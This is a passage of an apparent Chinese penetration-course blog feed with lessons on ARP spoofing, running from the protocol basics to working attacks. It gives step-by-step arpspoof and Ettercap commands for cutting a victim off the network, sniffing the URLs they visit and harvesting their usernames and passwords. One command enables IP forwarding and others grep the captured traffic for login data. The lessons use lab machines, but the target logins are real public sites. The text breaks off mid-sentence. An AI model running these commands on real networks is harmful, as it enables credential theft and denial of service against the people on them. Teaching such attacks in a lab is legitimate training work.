        <content type="html"><![CDATA[<h1 id="ARP-Ettercap劫持用户流量"><a href="#ARP-Ettercap劫持用户流量" class="headerlink" title="ARP-Ettercap劫持用户流量"></a>ARP-Ettercap劫持用户流量</h1><h2 id="一-ettercap-工具介绍"><a href="#一-ettercap-工具介绍" class="headerlink" title="一.ettercap 工具介绍"></a>一.ettercap 工具介绍</h2><p>项目官网：<a href="http://ettercap.github.io/ettercap/index.html">http://ettercap.github.io/ettercap/index.html</a></p><p>EtterCap是一个基于ARP地址欺骗方式的网络嗅探工具，主要适用于交换局域网络。借助于EtterCap嗅探软件，渗透测试人员可以检测网络内<strong>明文</strong>数据通讯的安全性，及时采取措施，避免敏感的用户名/密码等数据以明文的方式进行传输。</p><p>ettercap几乎是每个渗透测试人员必备的工具之一。</p><h2 id="二-ARP截获用户信息攻击步骤"><a href="#二-ARP截获用户信息攻击步骤" class="headerlink" title="二.ARP截获用户信息攻击步骤"></a>二.ARP截获用户信息攻击步骤</h2><h4 id="1-启动ettercap"><a href="#1-启动ettercap" class="headerlink" title="1.启动ettercap"></a>1.启动ettercap</h4><pre class="line-numbers language-none"><code class="language-none">ettercap -G<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-点击右上角的对勾开始扫描"><a href="#2-点击右上角的对勾开始扫描" class="headerlink" title="2.点击右上角的对勾开始扫描"></a><strong>2.点击右上角的对勾开始扫描</strong></h4><p><img src="/.%5Cassets%5C%E5%BC%80%E5%90%AF%E6%89%AB%E6%8F%8F.png" alt="开启扫描"></p><h4 id="3-点击左上角查看主机列表"><a href="#3-点击左上角查看主机列表" class="headerlink" title="3.点击左上角查看主机列表"></a><strong>3.点击左上角查看主机列表</strong></h4><p><img src="/.%5Cassets%5C%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8.png" alt="查看主机列表"></p><h4 id="4-选择网关-点击底部的-Add-to-Target-1"><a href="#4-选择网关-点击底部的-Add-to-Target-1" class="headerlink" title="4.选择网关 点击底部的 Add to Target 1"></a><strong>4.选择网关 点击底部的 Add to Target 1</strong></h4><p><img src="/.%5Cassets%5C%E5%B0%86%E7%BD%91%E5%85%B3%E5%8A%A0%E5%85%A5%E7%9B%AE%E6%A0%871.png" alt="将网关加入目标1"></p><h4 id="5-选择攻击靶机加入到target2"><a href="#5-选择攻击靶机加入到target2" class="headerlink" title="5.选择攻击靶机加入到target2"></a><strong>5.选择攻击靶机加入到target2</strong></h4><p><img src="/.%5Cassets%5C%E5%B0%86%E9%9D%B6%E6%9C%BA%E5%8A%A0%E5%85%A5%E5%88%B0%E7%9B%AE%E6%A0%872.png" alt="将靶机加入到目标2"></p><h4 id="6-点击右上角攻击菜单，选择ARP攻击"><a href="#6-点击右上角攻击菜单，选择ARP攻击" class="headerlink" title="6.点击右上角攻击菜单，选择ARP攻击"></a><strong>6.点击右上角攻击菜单，选择ARP攻击</strong></h4><p><img src="/.%5Cassets%5C%E9%80%89%E6%8B%A9ARP%E6%94%BB%E5%87%BB.png" alt="选择ARP攻击"></p><h4 id="7-点击ok发起攻击"><a href="#7-点击ok发起攻击" class="headerlink" title="7.点击ok发起攻击"></a><strong>7.点击ok发起攻击</strong></h4><p><img src="/.%5Cassets%5C%E7%82%B9%E5%87%BBok%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB.png" alt="点击ok发起攻击"></p><h4 id="8-查看此时靶机的arp列表"><a href="#8-查看此时靶机的arp列表" class="headerlink" title="8.查看此时靶机的arp列表"></a>8.查看此时靶机的arp列表</h4><pre class="line-numbers language-none"><code class="language-none">arp -a|findstr 192.168.110.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-查看kali的mac地址"><a href="#9-查看kali的mac地址" class="headerlink" title="9.查看kali的mac地址"></a>9.查看kali的mac地址</h4><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-靶机登录网站"><a href="#10-靶机登录网站" class="headerlink" title="10.靶机登录网站"></a><strong>10.靶机登录网站</strong></h4><pre class="line-numbers language-none"><code class="language-none">http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2Fhttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="11-截获用户流量，获取账号密码"><a href="#11-截获用户流量，获取账号密码" class="headerlink" title="11.截获用户流量，获取账号密码"></a><strong>11.截获用户流量，获取账号密码</strong></h4><p><img src="/.%5Cassets%5C%E6%88%AA%E8%8E%B7%E7%94%A8%E6%88%B7%E6%B5%81%E9%87%8F%E4%BF%A1%E6%81%AF.png" alt="截获用户流量信息"></p><h4 id="12-停止攻击"><a href="#12-停止攻击" class="headerlink" title="12.停止攻击"></a><strong>12.停止攻击</strong></h4><p><img src="/.%5Cassets%5C%E5%81%9C%E6%AD%A2%E6%94%BB%E5%87%BB.png" alt="停止攻击"></p><h2 id="三-Ettercap-软件功能介绍"><a href="#三-Ettercap-软件功能介绍" class="headerlink" title="三.Ettercap 软件功能介绍"></a>三.Ettercap 软件功能介绍</h2><h4 id="1-启动界面"><a href="#1-启动界面" class="headerlink" title="1.启动界面"></a><strong>1.启动界面</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A21.png" alt="界面1"></p><ul><li><p>Sniffing at startup :开启嗅探模式</p></li><li><p>Primary interface :选择网卡</p></li><li><p>Bridged sniffing :是否开启<strong>桥接</strong>模式</p></li><li><p>Bridged interface :桥接模式下的网卡</p></li></ul><p>配置完成后，我们点上方的✔即可完成配置。</p><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A22.png" alt="界面2"></p><h4 id="2-中间人攻击菜单"><a href="#2-中间人攻击菜单" class="headerlink" title="2.中间人攻击菜单"></a><strong>2.中间人攻击菜单</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A23.png" alt="界面3"></p><ul><li><p>ARP poisoning :<strong>ARP攻击</strong></p></li><li><p>DNP poisoning :DNP攻击</p></li><li><p>ICMP redirect :icmp重定向</p></li><li><p>Port stealing :端口欺骗</p></li><li><p>DHCP spoofing :DHCP欺骗</p></li><li><p>stop MITM :停止攻击</p></li><li><p>SSL intercept :ssl嗅探</p></li></ul><h4 id="3-更多选项"><a href="#3-更多选项" class="headerlink" title="3.更多选项"></a><strong>3.更多选项</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A24.png" alt="界面4"></p><ul><li><p>Targets:<strong>攻击列表</strong></p></li><li><p>Hosts：显示主机列表</p></li><li><p>Filters：载入二进制脚本</p></li><li><p>Plugins：插件</p></li><li><p>Logging:日志</p></li></ul><h4 id="4-hosts选项"><a href="#4-hosts选项" class="headerlink" title="4.hosts选项"></a><strong>4.hosts选项</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A25.png" alt="界面5"></p><ul><li><p>Hosts list：扫描到的主机列表</p></li><li><p>Enable ipv6 scan：扫描ipv6地址</p></li><li><p>Scan for hosts：扫描主机列表</p></li><li><p>load hosts form file：从外部文件载入主机列表</p></li><li><p>Save hosts to file：保存主机列表到文件</p></li></ul><h4 id="5-Targets选项"><a href="#5-Targets选项" class="headerlink" title="5.Targets选项"></a><strong>5.Targets选项</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A26.png" alt="界面6"></p><ul><li><p>Current targets：<strong>正在攻击的列表</strong></p></li><li><p>Select targets:：选择攻击列表</p></li><li><p>Portocol：攻击协议</p></li><li><p>Reverse matching：匹配规则</p></li><li><p>Wipe targets：擦除攻击</p></li></ul><h4 id="6-View选项"><a href="#6-View选项" class="headerlink" title="6.View选项"></a><strong>6.View选项</strong></h4><p><img src="/.%5Cassets%5C%E7%95%8C%E9%9D%A27.png" alt="界面7"></p><ul><li><p>Connections：连接信息</p></li><li><p>Profiles：IP地址信息</p></li><li><p>Statistics：统计信息</p></li></ul><h2 id="四-命令行运行Ettercap"><a href="#四-命令行运行Ettercap" class="headerlink" title="四.命令行运行Ettercap"></a>四.命令行运行Ettercap</h2><h4 id="1-运行命令讲解"><a href="#1-运行命令讲解" class="headerlink" title="1.运行命令讲解"></a><strong>1.运行命令讲解</strong></h4><pre class="line-numbers language-none"><code class="language-none">ettercap –i –eth0 –Tq –M arp:remote/ip(host)//net gatemask/ &gt;&gt;b.txtT：指的是text文本模式q：指的是安静模式执行这个命令i：后面跟的是连接局域网的网卡M：后面跟的是指定使用arp的方式&gt;&gt;：输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-攻击命令"><a href="#2-攻击命令" class="headerlink" title="2.攻击命令"></a><strong>2.攻击命令</strong></h4><pre class="line-numbers language-none"><code class="language-none">ettercap -T -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// ettercap -Tq -l a.log -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// ettercap -Tq -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// &gt;&gt;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-靶机登录后台网站"><a href="#3-靶机登录后台网站" class="headerlink" title="3.靶机登录后台网站"></a><strong>3.靶机登录后台网站</strong></h4><pre class="line-numbers language-none"><code class="language-none">http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2Fhttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-查看攻击界面日志"><a href="#4-查看攻击界面日志" class="headerlink" title="4.查看攻击界面日志"></a><strong>4.查看攻击界面日志</strong></h4><pre class="line-numbers language-none"><code class="language-none">tail -f b.txt停止查看：CTRL+C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-过滤无用信息，只查看用户的登录信息"><a href="#5-过滤无用信息，只查看用户的登录信息" class="headerlink" title="5.过滤无用信息，只查看用户的登录信息"></a><strong>5.过滤无用信息，只查看用户的登录信息</strong></h4><pre class="line-numbers language-none"><code class="language-none">tail -f b.txt | grep "USER" 或者tail -f b.txt | grep "CONTENT" 或者tail -f b.txt | egrep "USER|CONTENT"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-停止ARP攻击"><a href="#6-停止ARP攻击" class="headerlink" title="6.停止ARP攻击"></a><strong>6.停止ARP攻击</strong></h4><pre class="line-numbers language-none"><code class="language-none">CTRL+C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-分析日志"><a href="#7-分析日志" class="headerlink" title="7.分析日志"></a><strong>7.分析日志</strong></h4><pre class="line-numbers language-none"><code class="language-none">cat b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-筛选用户的登录信息"><a href="#8-筛选用户的登录信息" class="headerlink" title="8.筛选用户的登录信息"></a><strong>8.筛选用户的登录信息</strong></h4><pre class="line-numbers language-none"><code class="language-none">cat b.txt | grep "USER" 或者cat b.txt | grep "CONTENT" 或者cat b.txt | egrep "USER|CONTENT"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-收集保存用户信息文件"><a href="#9-收集保存用户信息文件" class="headerlink" title="9.收集保存用户信息文件"></a>9.收集保存用户信息文件</h4><pre class="line-numbers language-none"><code class="language-none">cat -n  b.txt | egrep "USER|CONTENT" &gt;arp.log-n:添加行号egrep：过滤规则&gt;:输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五：课堂小结"><a href="#五：课堂小结" class="headerlink" title="五：课堂小结"></a>五：课堂小结</h2><p>请查看：ARP-Ettercap劫持用户流量.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4.ARP-WireShark截获用户数据</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/4.arp-wireshark-jie-huo-yong-hu-shu-ju/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/4.arp-wireshark-jie-huo-yong-hu-shu-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP-WireShark截获用户数据"><a href="#ARP-WireShark截获用户数据" class="headerlink" title="ARP-WireShark截获用户数据"></a>ARP-WireShark截获用户数据</h1><h2 id="1-WireShark工具介绍"><a href="#1-WireShark工具介绍" class="headerlink" title="1.WireShark工具介绍"></a>1.WireShark工具介绍</h2><p>wireshark的官方下载网站： <a href="http://www.wireshark.org/">http://www.wireshark.org/</a></p><p>wireshark是非常流行的网络封包分析软件，功能十分强大。可以截取各种网络封包，显示网络封包的详细信息。</p><p>wireshark是开源软件，可以放心使用。 可以运行在Windows，linux和Mac OS上。</p><h2 id="2-ARP攻击截获密码的步骤"><a href="#2-ARP攻击截获密码的步骤" class="headerlink" title="2.ARP攻击截获密码的步骤"></a>2.ARP攻击截获密码的步骤</h2><p><strong>1.开启数据包转发</strong></p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.开启ARP攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3.启动wireshark</strong></p><pre class="line-numbers language-none"><code class="language-none">wireshark<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.输入过滤条件</strong></p><pre class="line-numbers language-none"><code class="language-none">(ip.src==192.168.110.11 or ip.dst==192.168.110.11) and tcp.port==80 and http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.靶机登录后台系统</strong></p><pre class="line-numbers language-none"><code class="language-none">http://mng.517628.com/login.phphttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>6.wireshark寻找用户的登录信息</strong></p><p><img src="/assets/%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png" alt="获取用户名"></p><p><img src="/assets/%E5%88%86%E6%9E%90%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png" alt="分析用户名和密码"></p><h2 id="3-WireSahrk-过滤命令讲解"><a href="#3-WireSahrk-过滤命令讲解" class="headerlink" title="3.WireSahrk 过滤命令讲解"></a>3.WireSahrk 过滤命令讲解</h2><p><strong>1.过滤源ip，目的ip</strong></p><p>​在wireshark的过滤规则框Filter中输入过滤条件。</p><p>​如查找目的地址为192.168.110.11的包</p><pre class="line-numbers language-none"><code class="language-none">ip.dst==192.168.110.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​查找源地址为1.1.1.1的包</p><pre class="line-numbers language-none"><code class="language-none">ip.src==1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.端口过滤</strong></p><p>2.1把源端口和目的端口为80的都过滤出来</p><pre class="line-numbers language-none"><code class="language-none">tcp.port==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.2只过滤目的端口为80的</p><pre class="line-numbers language-none"><code class="language-none">tcp.dstport==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.3只过滤源端口为80的包</p><pre class="line-numbers language-none"><code class="language-none">tcp.srcport==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3.协议过滤</strong></p><p>直接在Filter框中直接输入协议名即可滤</p><pre class="line-numbers language-none"><code class="language-none">httptcpssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>4.http模式过滤</strong></p><p>4.1过滤get包</p><pre class="line-numbers language-none"><code class="language-none">http.request.method=="GET"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.2过滤post包</p><pre class="line-numbers language-none"><code class="language-none">http.request.method=="POST"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.过滤多种条件</strong></p><p>用and连接，如过滤ip为192.168.110.11并且为http协议的</p><pre class="line-numbers language-none"><code class="language-none">ip.src==192.168.110.11 and http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-课堂小结"><a href="#4-课堂小结" class="headerlink" title="4.课堂小结"></a>4.课堂小结</h2><p>请看ARP-WireShark获取用户信息.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.ARP攻击-流量分析</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/3.arp-liu-liang-fen-xi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/3.arp-liu-liang-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP攻击-流量分析"><a href="#ARP攻击-流量分析" class="headerlink" title="ARP攻击-流量分析"></a>ARP攻击-流量分析</h1><h2 id="1-课前准备"><a href="#1-课前准备" class="headerlink" title="1.课前准备"></a>1.课前准备</h2><p>1.kali作为攻击机</p><p>2.win10作为靶机</p><h2 id="2-kali数据包转发"><a href="#2-kali数据包转发" class="headerlink" title="2.kali数据包转发"></a>2.kali数据包转发</h2><p>出于安全考虑，Linux系统默认是禁止数据包转发的。所谓<strong>转发</strong>即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。</p><p><strong>1.如何开启通信转发？</strong></p><p>kali里有个<strong>ip_forward</strong> 配置文件 </p><ol><li>默认是0 禁止端口转发</li><li>将其设置成1 开启端口转发</li></ol><p><strong>2.开启步骤</strong></p><p>1.查看当前是否开启了端口转发</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/sys/net/ipv4/ip_forward&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.开启通信转发的命令</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.使用arpspoof发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.win10验证是否转发成功</p><pre class="line-numbers language-none"><code class="language-none">访问：https://www.mashibing.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-dsniff工具"><a href="#3-dsniff工具" class="headerlink" title="3.dsniff工具"></a>3.dsniff工具</h2><p><strong>1.工具介绍</strong></p><p>Dsniff是一个基于unix系统网络嗅探工具，工具集包含两个我们需要的两个工具包，<strong>arpspoof</strong> 和<strong>urlsnarf</strong>。              </p><p><strong>2.安装方法</strong></p><pre class="line-numbers language-none"><code class="language-none">apt-get install dsniff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.urlsnarf工具介绍</p><pre class="line-numbers language-none"><code class="language-none">urlsnarf -hurlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]-n 表示不反查主机名-i interface 网卡接口名-p pattern 表示对过滤的内容使用的正则表达式-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-url流量分析"><a href="#4-url流量分析" class="headerlink" title="4.url流量分析"></a>4.url流量分析</h2><p><strong>1.概念</strong></p><p>URL流量嗅探操作非常<strong>类似于中间人攻击</strong>，通过目标主机将路由流量注入到因特网。该过程将通过ARP注入实现攻击。url嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。</p><p><strong>2.攻击流程</strong></p><p>1.开启流量转发</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.开启ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.捕获目标计算机的url</p><pre class="line-numbers language-none"><code class="language-none">urlsnarf -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.靶机上网，访问网站</p><pre class="line-numbers language-none"><code class="language-none">1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F2.http://blog.tianya.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.kali分析用户请求</p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请看ARP流量分析课后笔记.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.ARP断网攻击</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/2.arp-duan-wang-gong-ji/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/2.arp-duan-wang-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h1><h2 id="1-课前准备"><a href="#1-课前准备" class="headerlink" title="1.课前准备"></a>1.课前准备</h2><p>kali 作为ARP攻击机，192.168.70.3  MAC地址：00:0c:29:5f:7e:d4</p><p>win10 作为被攻击方，192.168.70.130   MAC地址：00:0c:29:8e:da:0f </p><p>网关（路由器），192.168.70.2    MAC地址：00:50:56:f3:07:7c</p><p>需要注意的时，两台主机需要在同一个局域网，并且网络通畅。</p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>计算上网的过程示意图：</p><p><img src="/assets/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E7%BD%91%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="计算机上网示意图"></p><h2 id="2-arp断网攻击原理"><a href="#2-arp断网攻击原理" class="headerlink" title="2.arp断网攻击原理"></a>2.arp断网攻击原理</h2><p>他的原理是：向目标主机不断的发送<strong>ARP报文</strong>，然后将其报文中的<strong>网关Mac地址</strong>设置成为<strong>攻击机的主机MAC地址</strong>，<br>然后目标主机想要访问网络发送数据包时，都会发送到攻击机，然后攻击机只需要<strong>做一个丢弃数据包的</strong><br><strong>命令</strong>，就可以断掉目标主机的网络了。</p><h2 id="3-arpspoof介绍"><a href="#3-arpspoof介绍" class="headerlink" title="3.arpspoof介绍:"></a>3.arpspoof介绍:</h2><p>arpspoof [spuːf]  是一个好用的ARP欺骗工具，攻击者通<strong>过毒化受害者ARP缓存</strong>，将网关MAC替换为攻击者MAC，然后攻击者可截获受害者发送和收到的数据包，从而获取受害者账户、密码等相关敏感信息。Kali linux中自带了该工具。</p><p>命令使用讲解</p><pre class="line-numbers language-none"><code class="language-none">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host-i：指定网卡-c:攻击机的IP-t 目标机器的IP-r：网关IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-具体攻击步骤："><a href="#4-具体攻击步骤：" class="headerlink" title="4.具体攻击步骤："></a>4.具体攻击步骤：</h2><p><strong>1.首先确保两台机器在同一局域网络下，并且可以互相通讯。</strong></p><p>​1.1查看kali的ip：</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.2 查看windows的ip：</p><pre class="line-numbers language-none"><code class="language-none">ipconfig /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.3 windows ping kali:</p><pre class="line-numbers language-none"><code class="language-none">ping 192.168.70.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.4 win10 查看arp表，记录网关的信息</p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.kali进行断网攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130-i:指定网卡-r:指定网关ip-t:指定靶机ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.win10 查看网络连接 和 kali 的网络链接</strong></p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.win10查看此时的arp表</strong></p><pre class="line-numbers language-none"><code class="language-none">arp -a 或者arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5.结束断网攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">ctrl+C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>6.win10重新查看网络状态</strong></p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>7.win10重新查看arp表</strong></p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-ARP断网攻击原理深入分析"><a href="#5-ARP断网攻击原理深入分析" class="headerlink" title="5.ARP断网攻击原理深入分析"></a>5.ARP断网攻击原理深入分析</h2><p>**1.ARP攻击断网的过程 **</p><pre class="line-numbers language-none"><code class="language-none">0:c:29:fc:66:46 1c:69:7a:a4:cf:92 0806 42: arp reply 192.168.70.2 is-at 0:c:29:fc:66:460:c:29:fc:66:46 e4:3a:6e:35:98:0 0806 42: arp reply 192.168.70.130 is-at 0:c:29:fc:66:46ARP攻击机器 不停的在告诉 192.168.70.2（网关）  192.168.70.130 的mac地址是 00:0c:29:fc:66:46ARP攻击机器 不停的在告诉 192.168.70.130（靶机） 192.168.70.2 的mac地址是 00:0c:29:fc:66:46Ctrl+C停止攻击后0:c:29:fc:66:46 1c:69:7a:a4:cf:92 0806 42: arp reply 192.168.70.2 is-at e4:3a:6e:35:98:00:c:29:fc:66:46 e4:3a:6e:35:98:0 0806 42: arp reply 192.168.70.130 is-at 1c:69:7a:a4:cf:92ARP攻击机器 重新告诉 192.168.70.130（靶机） 192.168.70.2 的mac地址是 e4:3a:6e:35:98:0ARP攻击机器 重新告诉 192.168.70.2（网关）  192.168.70.130 的mac地址是 1c:69:7a:a4:cf:92<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.ARP断网原理图：</strong></p><p><img src="/assets/%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%9B%BE.png" alt="断网攻击原理图"></p><h2 id="6-课堂小结"><a href="#6-课堂小结" class="headerlink" title="6.课堂小结"></a>6.课堂小结</h2><p>请看思维导图：ARP断网攻击课程总结.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.ARP原理</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/1.arp-yuan-li/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/1.arp-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="一-准备"><a href="#一-准备" class="headerlink" title="一.准备"></a>一.准备</h2><p>1.准备kali虚拟机 （原理演示机）</p><p>2.准备centos7虚拟机 （靶机）</p><h2 id="二-ARP协议工作原理"><a href="#二-ARP协议工作原理" class="headerlink" title="二.ARP协议工作原理"></a>二.ARP协议工作原理</h2><h4 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a>什么是ARP</h4><p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>获取<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129">物理地址</a>的一个<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>。</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>ARP协议规定,每台计算机都需要一个<strong>ARP表,用来保存IP地址和MAC地址的映射关系</strong> 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。</p><p>如果ARP表中匹配不到,就会使用<strong>广播</strong>的方式发送一个ARP请求 